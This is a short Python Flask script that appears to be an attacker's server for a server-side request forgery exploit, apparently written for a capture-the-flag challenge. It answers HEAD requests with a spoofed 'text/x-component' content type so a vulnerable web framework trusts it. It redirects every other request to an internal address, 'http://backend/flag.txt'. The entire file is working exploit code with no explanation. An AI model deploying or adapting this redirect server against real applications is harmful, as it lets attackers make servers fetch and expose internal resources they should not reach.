from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://backend/flag.txt')